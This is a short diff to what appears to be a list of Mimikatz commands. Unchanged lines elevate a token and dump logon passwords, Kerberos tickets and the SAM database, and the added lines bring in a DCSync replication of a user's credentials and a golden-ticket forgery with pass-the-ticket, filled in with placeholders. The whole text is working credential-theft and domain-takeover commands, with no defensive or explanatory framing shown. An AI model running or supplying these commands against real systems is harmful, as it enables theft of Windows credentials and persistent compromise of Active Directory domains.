@@ -3,3 +3,5 @@ token::elevate
 sekurlsa::logonpasswords
 sekurlsa::tickets
 lsadump::sam
+lsadump::dcsync /user:DOMAIN\USERNAME
+kerberos::golden /domain:DOMAIN /sid:DOMAIN_SID /ptt /target:IP /service:SPN /rc4:NTLM /user:USERNAME
